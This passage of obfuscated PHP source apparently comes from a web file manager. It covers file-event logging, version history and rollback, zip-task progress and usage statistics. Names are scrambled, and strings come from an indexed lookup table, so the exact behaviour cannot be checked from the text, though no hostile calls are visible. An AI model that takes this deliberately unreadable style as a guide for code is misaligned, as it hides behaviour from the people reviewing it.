$î§¥’¯) { return $this->addEvent($œŞ…¦†, $_SERVER[Ã¶¡¶„æ][1845], $î§¥’¯); } public function eventMove($èÊ¬ú, $âŸ©éÉ, $õîÏÎ•) { $Şå¨İòÕ =& $_SERVER[Ã¶¡¶„æ]; $µ¹ßËô‚ = Model($Şå¨İòÕ[1350]); $¢˜º·Ù– = $µ¹ßËô‚->sourceInfo($èÊ¬ú); $‰Ã©› = $µ¹ßËô‚->sourceInfo($âŸ©éÉ); $øšÚıà½ = $µ¹ßËô‚->sourceInfo($õîÏÎ•); $£ÂĞÛ½ = array($Şå¨İòÕ[1174] => $âŸ©éÉ, $Şå¨İòÕ[2095] => $‰Ã©›[$Şå¨İòÕ[32]], $Şå¨İòÕ[2073] => !empty($‰Ã©›[$Şå¨İòÕ[519]]) ? $‰Ã©›[$Şå¨İòÕ[519]] : $Şå¨İòÕ[12], $Şå¨İòÕ[1175] => $õîÏÎ•, $Şå¨İòÕ[2096] => $øšÚıà½[$Şå¨İòÕ[32]], $Şå¨İòÕ[2097] => !empty($øšÚıà½[$Şå¨İòÕ[519]]) ? $øšÚıà½[$Şå¨İòÕ[519]] : $Şå¨İòÕ[12]); $this->addEvent($èÊ¬ú, $Şå¨İòÕ[557], $£ÂĞÛ½); $¢˜º·Ù– = $µ¹ßËô‚->sourceInfo($èÊ¬ú); $£ÂĞÛ½ = array($Şå¨İòÕ[402] => $¢˜º·Ù–[$Şå¨İòÕ[402]], $Şå¨İòÕ[32] => $¢˜º·Ù–[$Şå¨İòÕ[32]]); $this->addEvent($âŸ©éÉ, $Şå¨İòÕ[2098], $£ÂĞÛ½); } public function eventCopy($µğš·ëÁ) { $this->eventCreate($µğš·ëÁ, $_SERVER[Ã¶¡¶„æ][555]); } public function eventRename($şÇ°“İÙ, $‘ĞøÕ›¡, $ƒÆœßªß) { $¡äÓ¸ß =& $_SERVER[Ã¶¡¶„æ]; $è•éğÂÜ = array($¡äÓ¸ß[1174] => $‘ĞøÕ›¡, $¡äÓ¸ß[1175] => $ƒÆœßªß); return $this->addEvent($şÇ°“İÙ, $¡äÓ¸ß[1365], $è•éğÂÜ); } public function eventAddComment($¿ôöí¸Ó, $‰°®›·¹) { return $this->addEvent($¿ôöí¸Ó, $_SERVER[Ã¶¡¶„æ][2099], $‰°®›·¹); } public function eventAddDesc($æ¹ï¢¾°, $˜Ú’ùíª) { return $this->addEvent($æ¹ï¢¾°, $_SERVER[Ã¶¡¶„æ][2100], $˜Ú’ùíª); } public function listBySource($ÜàÎãŠË) { $õ€íÛğ‰ =& $_SERVER[Ã¶¡¶„æ]; $”¶Ö‹ıç = Model($õ€íÛğ‰[1350])->sourceInfo($ÜàÎãŠË); $¨ö­ÛÕ• = array($õ€íÛğ‰[417] => $ÜàÎãŠË); if ($”¶Ö‹ıç[$õ€íÛğ‰[410]] == $õ€íÛğ‰[88]) { $‚ê™ = Model($õ€íÛğ‰[1350])->listSearchChildren($ÜàÎãŠË, 20000); $‚ê™[] = $ÜàÎãŠË . $õ€íÛğ‰[378]; $¨ö­ÛÕ• = array($õ€íÛğ‰[402] => array($õ€íÛğ‰[7], $‚ê™)); } $Ÿ‰¿ßæÏ = $this->where($¨ö­ÛÕ•)->order($õ€íÛğ‰[2101])->selectPage(); if ($Ÿ‰¿ßæÏ[$õ€íÛğ‰[366]][$õ€íÛğ‰[367]] == 0) { $Ÿ‰¿ßæÏ[$õ€íÛğ‰[366]][$õ€íÛğ‰[367]] = 1; $Ÿ‰¿ßæÏ[$õ€íÛğ‰[369]] = array(array($õ€íÛğ‰[417] => $ÜàÎãŠË, $õ€íÛğ‰[2082] => $”¶Ö‹ıç[$õ€íÛğ‰[432]], $õ€íÛğ‰[1667] => $”¶Ö‹ıç[$õ€íÛğ‰[454]], $õ€íÛğ‰[422] => $õ€íÛğ‰[2102], $õ€íÛğ‰[423] => $”¶Ö‹ıç[$õ€íÛğ‰[200]], $õ€íÛğ‰[1669] => $õ€íÛğ‰[12])); } return $this->eventListParse($Ÿ‰¿ßæÏ, $ÜàÎãŠË); } private function eventListParse($‚İ¼ë°œ, $´Œ¤°õ) { $¡ß®İô© =& $_SERVER[Ã¶¡¶„æ]; $Ø¡¶®‡à = $‚İ¼ë°œ[$¡ß®İô©[369]]; $«ĞéÀû = array_to_keyvalue($Ø¡¶®‡à, $¡ß®İô©[12], $¡ß®İô©[402]); $±ŠÓúĞ® = array_to_keyvalue($Ø¡¶®‡à, $¡ß®İô©[12], $¡ß®İô©[2088]); foreach ($Ø¡¶®‡à as $„ºäººµ) { $½îëè³« = $„ºäººµ[$¡ß®İô©[453]]; if ($„ºäººµ[$¡ß®İô©[33]] == $¡ß®İô©[557] && isset($½îëè³«[$¡ß®İô©[1174]])) { $«ĞéÀû[] = $½îëè³«[$¡ß®İô©[1174]] . $¡ß®İô©[12]; $«ĞéÀû[] = $½îëè³«[$¡ß®İô©[1175]] . $¡ß®İô©[12]; } if ($„ºäººµ[$¡ß®İô©[33]] == $¡ß®İô©[2098] && isset($½îëè³«[$¡ß®İô©[402]])) { $«ĞéÀû[] = $½îëè³«[$¡ß®İô©[402]] . $¡ß®İô©[12]; } } $«ĞéÀû = array_merge($«ĞéÀû, $±ŠÓúĞ®, array($´Œ¤°õ . $¡ß®İô©[12])); $«ĞéÀû = array_unique($«ĞéÀû); $ÙßˆŸô½ = array_unique(array_to_keyvalue($Ø¡¶®‡à, $¡ß®İô©[12], $¡ß®İô©[1676])); $òÔÒ¤‚³ = Model($¡ß®İô©[535])->userListInfo($ÙßˆŸô½); $–›ÔœÉ = Model($¡ß®İô©[831])->sourceListInfo($«ĞéÀû, !0); foreach ($Ø¡¶®‡à as &$„ºäººµ) { if ($„ºäººµ[$¡ß®İô©[33]] == $¡ß®İô©[557] && isset($„ºäººµ[$¡ß®İô©[453]][$¡ß®İô©[1174]])) { $„ºäººµ[$¡ß®İô©[453]][$¡ß®İô©[1174]] = $–›ÔœÉ[$„ºäººµ[$¡ß®İô©[453]][$¡ß®İô©[1174]]]; $„ºäººµ[$¡ß®İô©[453]][$¡ß®İô©[1175]] = $–›ÔœÉ[$„ºäººµ[$¡ß®İô©[453]][$¡ß®İô©[1175]]]; } if ($„ºäººµ[$¡ß®İô©[33]] == $¡ß®İô©[2098] && isset($„ºäººµ[$¡ß®İô©[453]][$¡ß®İô©[402]])) { $„ºäººµ[$¡ß®İô©[453]][$¡ß®İô©[402]] = $–›ÔœÉ[$„ºäººµ[$¡ß®İô©[453]][$¡ß®İô©[402]]]; } $„ºäººµ[$¡ß®İô©[86]] = $–›ÔœÉ[$„ºäººµ[$¡ß®İô©[402]]]; $„ºäººµ[$¡ß®İô©[2103]] = $–›ÔœÉ[$„ºäººµ[$¡ß®İô©[2088]]]; if ($„ºäººµ[$¡ß®İô©[33]] == $¡ß®İô©[1834]) { $„ºäººµ[$¡ß®İô©[2103]] = $„ºäººµ[$¡ß®İô©[86]]; $„ºäººµ[$¡ß®İô©[2088]] = $„ºäººµ[$¡ß®İô©[2103]][$¡ß®İô©[402]]; $„ºäººµ[$¡ß®İô©[86]] = !1; $„ºäººµ[$¡ß®İô©[402]] = $¡ß®İô©[12]; } $„ºäººµ[$¡ß®İô©[2033]] = $òÔÒ¤‚³[$„ºäººµ[$¡ß®İô©[1676]]]; } unset($„ºäººµ); $‚İ¼ë°œ[$¡ß®İô©[369]] = $Ø¡¶®‡à; return $‚İ¼ë°œ; } public function removeBySource($ü•½¬³¾) { $İˆ±ÚŞ¡ = array($_SERVER[Ã¶¡¶„æ][417] => $ü•½¬³¾); $this->where($İˆ±ÚŞ¡)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\143\x65\x5f\x68\x69\x73\164\x6f\162\171"; public function historyCount($á­¹„‰‘) { $ÙÁê¤Ö¾ =& $_SERVER[Ã¶¡¶„æ]; if (!$á­¹„‰‘) { return array(); } if (is_string($á­¹„‰‘) || is_int($á­¹„‰‘)) { $á­¹„‰‘ = array($á­¹„‰‘); } $‡óÙ¯¨ˆ = array($ÙÁê¤Ö¾[402], $ÙÁê¤Ö¾[1898] => $ÙÁê¤Ö¾[500]); $æÚ¨˜è· = array($ÙÁê¤Ö¾[402] => array($ÙÁê¤Ö¾[7], $á­¹„‰‘)); $ÊƒÑ™Ëé = $this->field($‡óÙ¯¨ˆ)->where($æÚ¨˜è·)->group($ÙÁê¤Ö¾[402])->select(); return array_to_keyvalue($ÊƒÑ™Ëé, $ÙÁê¤Ö¾[402], $ÙÁê¤Ö¾[500]); } public function addHistory($ìÂ÷È¼», $Ä°™û = '') { $½÷•ü¯ =& $_SERVER[Ã¶¡¶„æ]; $È¨®ÕòÔ = array($½÷•ü¯[417] => $ìÂ÷È¼»[$½÷•ü¯[402]], $½÷•ü¯[1667] => isset($ìÂ÷È¼»[$½÷•ü¯[456]]) ? $ìÂ÷È¼»[$½÷•ü¯[456]] : $ìÂ÷È¼»[$½÷•ü¯[454]], $½÷•ü¯[469] => $ìÂ÷È¼»[$½÷•ü¯[468]], $½÷•ü¯[585] => $ìÂ÷È¼»[$½÷•ü¯[76]], $½÷•ü¯[2104] => $Ä°™û); if ($GLOBALS[$½÷•ü¯[6]][$½÷•ü¯[89]][$½÷•ü¯[1232]] >= 1) { $this->historyAutoClear($È¨®ÕòÔ[$½÷•ü¯[402]]); $this->add($È¨®ÕòÔ); } Hook::trigger($½÷•ü¯[2105], $È¨®ÕòÔ); Model($½÷•ü¯[2106])->eventFileEdit($ìÂ÷È¼»[$½÷•ü¯[402]]); } private function historyAutoClear($Ç´Ğ§çš) { $œê‰Œóù =& $_SERVER[Ã¶¡¶„æ]; $¶ŞËÔÉó = Model($œê‰Œóù[776])->get($œê‰Œóù[1254]); $ˆ¨è°ÄØ = $GLOBALS[$œê‰Œóù[6]][$œê‰Œóù[89]][$œê‰Œóù[1232]]; $âßªó¼ = $¶ŞËÔÉó == $œê‰Œóù[1255] ? min(5, $ˆ¨è°ÄØ) : $ˆ¨è°ÄØ; $âßªó¼ = $âßªó¼ <= 0 ? 0 : $âßªó¼ - 1; if ($âßªó¼ >= 500) { return; } $ÀŠâóø = array($œê‰Œóù[417] => $Ç´Ğ§çš); $÷Ç• = $this->field($œê‰Œóù[2107])->where($ÀŠâóø)->order($œê‰Œóù[2101])->select(); if (!$÷Ç• || $âßªó¼ >= count($÷Ç•)) { return; } $ç¬êŞŞô = array_to_keyvalue($÷Ç•, $œê‰Œóù[12], $œê‰Œóù[399]); $ç¬êŞŞô = array_slice($ç¬êŞŞô, $âßªó¼); $âÅä ü¹ = array_to_keyvalue($÷Ç•, $œê‰Œóù[12], $œê‰Œóù[468]); $âÅä ü¹ = array_slice($âÅä ü¹, $âßªó¼); if (!$ç¬êŞŞô || !$âÅä ü¹) { return; } $ÀŠâóø = array($œê‰Œóù[419] => array($œê‰Œóù[7], $ç¬êŞŞô)); $this->where($ÀŠâóø)->delete(); Model($œê‰Œóù[471])->remove($âÅä ü¹); } public function listData($§‹Ú•®) { $Ø¤³ŠÄ =& $_SERVER[Ã¶¡¶„æ]; $Ûîó¶†Ü = array($Ø¤³ŠÄ[417] => $§‹Ú•®); $Ôç–Æ¼Ë = $Ø¤³ŠÄ[2108]; $ŸÎºœøÇ = $this->field($Ôç–Æ¼Ë)->where($Ûîó¶†Ü)->order($Ø¤³ŠÄ[2101])->selectPage(); $this->_listAppendUser($ŸÎºœøÇ[$Ø¤³ŠÄ[369]]); $ æ¢İ² = Model($Ø¤³ŠÄ[776])->get($Ø¤³ŠÄ[1254]); $ı¼€ì¹ß = 5; if ($ æ¢İ² == $Ø¤³ŠÄ[1255]) { $ŸÎºœøÇ[$Ø¤³ŠÄ[369]] = array_slice($ŸÎºœøÇ[$Ø¤³ŠÄ[369]], 0, $ı¼€ì¹ß); $ŸÎºœøÇ[$Ø¤³ŠÄ[366]] = array($Ø¤³ŠÄ[2109] => 1, $Ø¤³ŠÄ[2110] => 20, $Ø¤³ŠÄ[2111] => 1, $Ø¤³ŠÄ[2112] => count($ŸÎºœøÇ[$Ø¤³ŠÄ[369]])); } return $ŸÎºœøÇ; } protected function _listAppendUser(&$Åé‰‹ñ¢) { $Î¡ØÖâ· =& $_SERVER[Ã¶¡¶„æ]; $°…ûñùñ = array_to_keyvalue($Åé‰‹ñ¢, $Î¡ØÖâ·[12], $Î¡ØÖâ·[1676]); $ïúûñ¦ = Model($Î¡ØÖâ·[535])->userListInfo($°…ûñùñ); foreach ($Åé‰‹ñ¢ as &$Şı¦ó’Ş) { $Û§Û³” = $Şı¦ó’Ş[$Î¡ØÖâ·[1676]]; $Şı¦ó’Ş[$Î¡ØÖâ·[454]] = $ïúûñ¦[$Û§Û³”] ? $ïúûñ¦[$Û§Û³”] : !1; } unset($Şı¦ó’Ş); } public function fileInfo($ïÂÍ³‡û) { $¶µÈĞ„— =& $_SERVER[Ã¶¡¶„æ]; $ÅÓ™…¥ = $this->tablePrefix; $Š™¯÷¡ = "{$ÅÓ™…¥}\x69\x6f\x5f\146\x69\x6c\145\40\x66\x69\x6c\145\x73\40\x6f\x6e\x20\146\151\x6c\145\163\x2e\x66\151\x6c\145\x49\x44\x20\x3d\40\150\x69\163\x74\157\162\x79\56\146\151\154\145\x49\104"; return $this->alias($¶µÈĞ„—[2113])->where(array($¶µÈĞ„—[419] => $ïÂÍ³‡û))->join($Š™¯÷¡, $¶µÈĞ„—[2114])->find(); } public function removeItem($·âªà×) { $”˜œ‡Û =& $_SERVER[Ã¶¡¶„æ]; $Ç×´Á¯Æ = array($”˜œ‡Û[419] => $·âªà×); $˜¯Öœöç = $this->where($Ç×´Á¯Æ)->find(); if ($˜¯Öœöç) { $‚†€¬Î® = $this->where($Ç×´Á¯Æ)->delete(); Model($”˜œ‡Û[471])->remove($˜¯Öœöç[$”˜œ‡Û[468]]); return $‚†€¬Î®; } return !1; } public function removeBySource($ıÅÕ˜†Å) { $¡úéÈá² =& $_SERVER[Ã¶¡¶„æ]; if (!$ıÅÕ˜†Å) { return !1; } if (!is_array($ıÅÕ˜†Å)) { $ıÅÕ˜†Å = array($ıÅÕ˜†Å); } $‚ò¥ÅÎ = array($¡úéÈá²[417] => array($¡úéÈá²[7], $ıÅÕ˜†Å)); $Ê¨”‘¦Ÿ = $this->field($¡úéÈá²[469])->where($‚ò¥ÅÎ)->select(); if ($Ê¨”‘¦Ÿ) { $this->where($‚ò¥ÅÎ)->delete(); $ç‘˜­½‡ = array_to_keyvalue($Ê¨”‘¦Ÿ, $¡úéÈá²[12], $¡úéÈá²[468]); Model($¡úéÈá²[471])->remove($ç‘˜­½‡); } return !0; } public function setDetail($»¸êõŞı, $®Õ×µ) { $‚È˜¬ =& $_SERVER[Ã¶¡¶„æ]; return $this->where(array($‚È˜¬[419] => $»¸êõŞı))->save(array($‚È˜¬[2104] => $®Õ×µ)); } public function rollbackToItem($éóÊ¥Ñ¡, $ÀúËœŒ‹) { $‚¸²‘Î¼ =& $_SERVER[Ã¶¡¶„æ]; $ã¯¾Ã… = Model($‚¸²‘Î¼[831])->sourceInfo($éóÊ¥Ñ¡); $this->addHistory($ã¯¾Ã…, LNG($‚¸²‘Î¼[2115])); $œïÌÉ®ê = $this->find($ÀúËœŒ‹); $ê³¡½Êò = array($‚¸²‘Î¼[468] => $œïÌÉ®ê[$‚¸²‘Î¼[468]], $‚¸²‘Î¼[76] => $œïÌÉ®ê[$‚¸²‘Î¼[76]], $‚¸²‘Î¼[85] => time(), $‚¸²‘Î¼[456] => USER_ID); Model($‚¸²‘Î¼[831])->where(array($‚¸²‘Î¼[402] => $éóÊ¥Ñ¡))->save($ê³¡½Êò); return $this->where(array($‚¸²‘Î¼[419] => $ÀúËœŒ‹))->delete(); } public function clearSame($”ÃèŠÈõ) { $ã’ÕÛÑ =& $_SERVER[Ã¶¡¶„æ]; $²ãşï›æ = $this->listData($”ÃèŠÈõ); $„µãŒ•¸ = array_to_keyvalue_group($²ãşï›æ, $ã’ÕÛÑ[468]); $ıÆİØ… = array(); $”•˜™³ë = array(); foreach ($„µãŒ•¸ as $†ä¡š²) { if (!$†ä¡š² || count($†ä¡š²) <= 1) { continue; } foreach ($†ä¡š² as $ÒÓ¸êÜ») { $ıÆİØ…[] = $ÒÓ¸êÜ»[$ã’ÕÛÑ[468]]; $”•˜™³ë[] = $ÒÓ¸êÜ»[$ã’ÕÛÑ[399]]; } } if (!$”•˜™³ë) { return; } $this->where(array($ã’ÕÛÑ[399] => array($ã’ÕÛÑ[7], $”•˜™³ë)))->delete(); Model($ã’ÕÛÑ[471])->remove($ıÆİØ…); } public function userSpace() { $Ø˜¿´ ¹ =& $_SERVER[Ã¶¡¶„æ]; $çøä•£’ = $this->tablePrefix; $ğò¨¾à€ = array($Ø˜¿´ ¹[1667] => USER_ID); $¡çç‘‡´ = "{$çøä•£’}\x69\x6f\x5f\146\151\x6c\145\x20\146\x69\154\x65\x73\40\157\x6e\40\146\x69\154\145\163\56\146\x69\x6c\x65\111\x44\x20\x3d\40\x68\x69\163\164\x6f\x72\x79\56\x66\151\154\145\111\104"; return $this->alias($Ø˜¿´ ¹[2113])->where($ğò¨¾à€)->join($¡çç‘‡´, $Ø˜¿´ ¹[2114])->sum($Ø˜¿´ ¹[76]); } } goto càêÜÙœÂì; bêåªÂË°´: class TaskZip extends TaskFileTransfer { protected function startAfter() { $òí–¸€ =& $_SERVER[Ã¶¡¶„æ]; parent::startAfter(); Hook::bind($òí–¸€[1792], array($this, $òí–¸€[1787])); $¤ÁôƒÍî =& $this->task; $¤ÁôƒÍî[$òí–¸€[1789]] = $òí–¸€[1209]; if (!$¤ÁôƒÍî[$òí–¸€[1576]]) { $¤ÁôƒÍî[$òí–¸€[1576]] = LNG($òí–¸€[1793]); } } protected function endAfter() { $¼ıÏáİ£ =& $_SERVER[Ã¶¡¶„æ]; parent::endAfter(); Hook::unbind($¼ıÏáİ£[1792], array($this, $¼ıÏáİ£[1787])); } public function updateAfter() { $÷Œºêèó =& $_SERVER[Ã¶¡¶„æ]; $¸´¹Ã• =& $this->task; if (!$¸´¹Ã•[$÷Œºêèó[792]] || !$¸´¹Ã•[$÷Œºêèó[769]]) { return; } if ($¸´¹Ã•[$÷Œºêèó[1789]] == $÷Œºêèó[1209]) { $Å¬Î†¸– = $¸´¹Ã•[$÷Œºêèó[1730]]; if ($¸´¹Ã•[$÷Œºêèó[1731]] != $÷Œºêèó[1209]) { $Å¬Î†¸– = 0; } $Ìµ²Ö½¶ = ($¸´¹Ã•[$÷Œºêèó[1734]] + $Å¬Î†¸–) / $¸´¹Ã•[$÷Œºêèó[769]]; $¸´¹Ã•[$÷Œºêèó[1678]] = $Ìµ²Ö½¶ * 0.3; } else { if ($¸´¹Ã•[$÷Œºêèó[1789]] == $÷Œºêèó[313]) { $Ìµ²Ö½¶ = $¸´¹Ã•[$÷Œºêèó[1677]] / $¸´¹Ã•[$÷Œºêèó[792]]; $¸´¹Ã•[$÷Œºêèó[1678]] = 0.3 + $Ìµ²Ö½¶ * 0.5; } else { if ($¸´¹Ã•[$÷Œºêèó[1789]] == $÷Œºêèó[107]) { $Ìµ²Ö½¶ = 0; if ($¸´¹Ã•[$÷Œºêèó[1729]]) { $Ìµ²Ö½¶ = $¸´¹Ã•[$÷Œºêèó[1730]] / $¸´¹Ã•[$÷Œºêèó[1729]]; } $¸´¹Ã•[$÷Œºêèó[1678]] = 0.3 + 0.5 + $Ìµ²Ö½¶ * 0.2; } } } if ($¸´¹Ã•[$÷Œºêèó[1678]] > 0) { $ĞÑ›•ßü = timeFloat() - $¸´¹Ã•[$÷Œºêèó[1680]] - $¸´¹Ã•[$÷Œºêèó[1683]]; $¸´¹Ã•[$÷Œºêèó[1684]] = $ĞÑ›•ßü * (1 - $¸´¹Ã•[$÷Œºêèó[1678]]) / $¸´¹Ã•[$÷Œºêèó[1678]]; } } public function copyFileStart($ÑŠ¹Ø²ä, $œÛ’—¦¨, $ªÉÉ’£ª, $Ô¸Õ½Á¦, $ öÉà÷ş, $Ïü°¿é) { $¸ó™§Åé =& $_SERVER[Ã¶¡¶„æ]; parent::copyFileStart($ÑŠ¹Ø²ä, $œÛ’—¦¨, $ªÉÉ’£ª, $Ô¸Õ½Á¦, $ öÉà÷ş, $Ïü°¿é); $óòû…äâ =& $this->task; if ($óòû…äâ[$¸ó™§Åé[1789]] == $¸ó™§Åé[313]) { $óòû…äâ[$¸ó™§Åé[1789]] = $¸ó™§Åé[107]; } $this->update(); } public function copyFileEnd($·œê ›‘, $º²—åÜè, $´Ô«ôîà, $ÃÖ‘Ø£À, $ ‚È‰‹Ì, $ƒÁ»¿ää) { $† ­§Ë¿ =& $_SERVER[Ã¶¡¶„æ]; $™¶´é =& $this->task; $™¶´é[$† ­§Ë¿[1730]] = $™¶´é[$† ­§Ë¿[1729]]; $™¶´é[$† ­§Ë¿[1734]] += $™¶´é[$† ­§Ë¿[1729]]; $™¶´é[$† ­§Ë¿[1731]] = $† ­§Ë¿[12]; $this->update(); } public function nameParse($Óü†°Í) { $…¨ŸÎÒ =& $_SERVER[Ã¶¡¶„æ]; $£Ïãªù =& $this->task; if ($£Ïãªù[$…¨ŸÎÒ[1677]] < $£Ïãªù[$…¨ŸÎÒ[792]]) { $¢ÌĞüÉã = get_path_this($Óü†°Í); if (strstr($¢ÌĞüÉã, $…¨ŸÎÒ[10])) { $£Ïãªù[$…¨ŸÎÒ[1677]] += 1; } } if ($£Ïãªù[$…¨ŸÎÒ[1789]] == $…¨ŸÎÒ[1209]) { $£Ïãªù[$…¨ŸÎÒ[1789]] = $…¨ŸÎÒ[313]; } $£Ïãªù[$…¨ŸÎÒ[1727]] = $Óü†°Í; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($’Äşğ±±) { $¢ÙÑä¼ =& $_SERVER[Ã¶¡¶„æ]; $Íû“òÙÉ = array($¢ÙÑä¼[600] => array($¢ÙÑä¼[33] => $¢ÙÑä¼[1794], $¢ÙÑä¼[273] => array($¢ÙÑä¼[224], $¢ÙÑä¼[771], $¢ÙÑä¼[1795], $¢ÙÑä¼[1796])), $¢ÙÑä¼[1797] => array($¢ÙÑä¼[33] => $¢ÙÑä¼[1798], $¢ÙÑä¼[273] => array($¢ÙÑä¼[224], $¢ÙÑä¼[769], $¢ÙÑä¼[1799], $¢ÙÑä¼[1800], $¢ÙÑä¼[1801]))); if (!isset($Íû“òÙÉ[$’Äşğ±±])) { return !1; } $this->optionType = $Íû“òÙÉ[$’Äşğ±±][$¢ÙÑä¼[33]]; $this->field = $Íû“òÙÉ[$’Äşğ±±][$¢ÙÑä¼[273]]; return !0; } public function listData($½®Úëï = false, $ïò¤Û¸ô = "\155\x6f\x64\x69\146\x79\x54\x69\155\145", $Ÿå‚‘©Í = false) { return parent::listData($½®Úëï, $ïò¤Û¸ô, $Ÿå‚‘©Í); } public function trendList($õêÍ›¨Æ) { $¨Í†Æµ =& $_SERVER[Ã¶¡¶„æ]; $æäê¦û = $this->listData(); if ($æäê¦û) { $ˆé¾—¸¯ = end($æäê¦û); $¨€†ÏÜ = date($¨Í†Æµ[1802], strtotime($¨Í†Æµ[1803])); if ($ˆé¾—¸¯[$¨Í†Æµ[224]] == $¨€†ÏÜ) { return $æäê¦û; } $üşóÇ‹Ê = strtotime($ˆé¾—¸¯[$¨Í†Æµ[224]]); } if (!isset($üşóÇ‹Ê)) { $ÔşÆë˜ = $õêÍ›¨Æ == $¨Í†Æµ[600] ? $¨Í†Æµ[535] : $¨Í†Æµ[831]; $üşóÇ‹Ê = Model($ÔşÆë˜)->min($¨Í†Æµ[200]); } $â‹íµ­· = $¨Í†Æµ[1804] . ucfirst($õêÍ›¨Æ); $„¶¹‚¦ = $this->dateList($üşóÇ‹Ê); foreach ($„¶¹‚¦ as $¨€†ÏÜ) { $this->{$â‹íµ­·}($¨€†ÏÜ); } return $this->listData(); } private function dateList($“ØğÍ† ) { $Ê™Œ²  =& $_SERVER[Ã¶¡¶„æ]; $×«ŸÚİÀ = $“ØğÍ† ; $­Íı¤ÛĞ = strtotime($Ê™Œ² [1803]); $´Éò£Õª = array(); while ($×«ŸÚİÀ <= $­Íı¤ÛĞ) { $´Éò£Õª[] = date($Ê™Œ² [1802], $×«ŸÚİÀ); $×«ŸÚİÀ = strtotime($Ê™Œ² [1805], $×«ŸÚİÀ); } return $´Éò£Õª; } public function _recordUser($Âö´Œ¾œ = '') { $’±¿‹‚Ü =& $_SERVER[Ã¶¡¶„æ]; $ø×Úí½Ö = strtotime(date($’±¿‹‚Ü[1806], strtotime($Âö´Œ¾œ))); $ÒÄÎ¢®ş = strtotime(date($’±¿‹‚Ü[1807], strtotime($Âö´Œ¾œ))); $šø§¯Ö½ = array($’±¿‹‚Ü[200] => array($’±¿‹‚Ü[1027], $ÒÄÎ¢®ş)); $é¢áµ§ = Model($’±¿‹‚Ü[535])->where($šø§¯Ö½)->count($’±¿‹‚Ü[1676]); $šø§¯Ö½[$’±¿‹‚Ü[200]] = array($’±¿‹‚Ü[333], array($ø×Úí½Ö, $ÒÄÎ¢®ş)); $“¨“¬šç = Model($’±¿‹‚Ü[535])->where($šø§¯Ö½)->count($’±¿‹‚Ü[1676]); $šø§¯Ö½[$’±¿‹‚Ü[33]] = $’±¿‹‚Ü[1808]; $ó¨—¾ = Model($’±¿‹‚Ü[1809])->where($šø§¯Ö½)->count($’±¿‹‚Ü[1810]); $–¦€î‘’ = array($’±¿‹‚Ü[224] => $Âö´Œ¾œ, $’±¿‹‚Ü[771] => (int) $é¢áµ§, $’±¿‹‚Ü[1795] => (int) $“¨“¬šç, $’±¿‹‚Ü[1796] => (int) $ó¨—¾); return $this->insert($–¦€î‘’); } public function _recordStore($¤÷Áñêº = '') { $ƒŠŒ×Éœ =& $_SERVER[Ã¶¡¶„æ]; $£ÌùÁ¡ï = strtotime(date($ƒŠŒ×Éœ[1807], strtotime($¤÷Áñêº))); $‰¶¨¾¬ = array($ƒŠŒ×Éœ[200] => array($ƒŠŒ×Éœ[1027], $£ÌùÁ¡ï)); $® «€Æ‹ = Model($ƒŠŒ×Éœ[471])->where($‰¶¨¾¬)->sum($ƒŠŒ×Éœ[76]); $‰¶¨¾¬[$ƒŠŒ×Éœ[410]] = 0; $İƒÖ½‹½ = Model($ƒŠŒ×Éœ[831])->where($‰¶¨¾¬)->sum($ƒŠŒ×Éœ[76]); $‰¶¨¾¬[$ƒŠŒ×Éœ[411]] = 1; $ÜÖ£Ô”Ø = Model($ƒŠŒ×Éœ[831])->where($‰¶¨¾¬)->sum($ƒŠŒ×Éœ[76]); $‰¶¨¾¬[$ƒŠŒ×Éœ[411]] = 2; $©˜Ç»åí = Model($ƒŠŒ×Éœ[831])->where($‰¶¨¾¬)->sum($ƒŠŒ×Éœ[76]); $÷ŠÑµ• = array($ƒŠŒ×Éœ[224] => $¤÷Áñêº, $ƒŠŒ×Éœ[769] => (int) $İƒÖ½‹½, $ƒŠŒ×Éœ[1799] => (int) $® «€Æ‹, $ƒŠŒ×Éœ[1800] => (int) $ÜÖ£Ô”Ø, $ƒŠŒ×Éœ[1801] => (int) $©˜Ç»åí); return $this->insert($÷ŠÑµ•); } public function trend($š©È©­, $µ§Éıì˜) { $ş¯ãÏ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->init($š©È©­)) { return !1; } $›Ñ»§°Ó = $this->trendList($š©È©­); if ($›Ñ»§°Ó && $µ§Éıì˜ != $ş¯ãÏ[1649]) { $º™Ù½Öş = $›Ñ»§°Ó[0][$ş¯ãÏ[224]]; $â®ŠÓçâ = $this->validDate($µ§Éıì˜, $º™Ù½Öş); $»åŠæ‚ƒ = array(); $±³Ëç­ë = array_to_keyvalue($›Ñ»§°Ó, $ş¯ãÏ[224]); foreach ($â®ŠÓçâ as $ÈØÉü„) { if (isset($±³Ëç­ë[$ÈØÉü„])) { $¡¦®öĞî = $±³Ëç­ë[$ÈØÉü„]; } else { $¡¦®öĞî = end($›Ñ»§°Ó); $¡¦®öĞî[$ş¯ãÏ[224]] = $ÈØÉü„; if ($š©È©­ == $ş¯ãÏ[600]) { $¡¦®öĞî[$ş¯ãÏ[1795]] = $¡¦®öĞî[$ş¯ãÏ[1796]] = 0; } } $»åŠæ‚ƒ[] = $¡¦®öĞî; } $›Ñ»§°Ó = $»åŠæ‚ƒ; } $Ç·£‰ğ = array($ş¯ãÏ[600] => array($ş¯ãÏ[771] => LNG($ş¯ãÏ[1811]), $ş¯ãÏ[1795] => LNG($ş¯ãÏ[1812]), $ş¯ãÏ[1796] => LNG($ş¯ãÏ[1813])), $ş¯ãÏ[1797] => array($ş¯ãÏ[769] => LNG($ş¯ãÏ[1814]), $ş¯ãÏ[1799] => LNG($ş¯ãÏ[1815]), $ş¯ãÏ[1800] => LNG($ş¯ãÏ[1816]), $ş¯ãÏ[1801] => LNG($ş¯ãÏ[1817]))); $½Ä‚ä¾ = array($ş¯ãÏ[600] => $ş¯ãÏ[1818], $ş¯ãÏ[1797] => $ş¯ãÏ[76]); if (empty($›Ñ»§°Ó)) { $ÈØÉü„ = date($ş¯ãÏ[1802], strtotime($ş¯ãÏ[1803])); $šØ´æÊ = array($ş¯ãÏ[224] => $ÈØÉü„); foreach ($Ç·£‰ğ[$š©È©­] as $—ìÇ¶· => $ŸÚäë‹Ü) { $šØ´æÊ[$—ìÇ¶·] = 0; } $›Ñ»§°Ó[] = $šØ´æÊ; } $¨Ï‘ß£ = array(); foreach ($›Ñ»§°Ó as $ŸÚäë‹Ü) { if ($š©È©­ == $ş¯ãÏ[1797] && $ŸÚäë‹Ü[$ş¯ãÏ[1799]] > $ŸÚäë‹Ü[$ş¯ãÏ[769]]) { 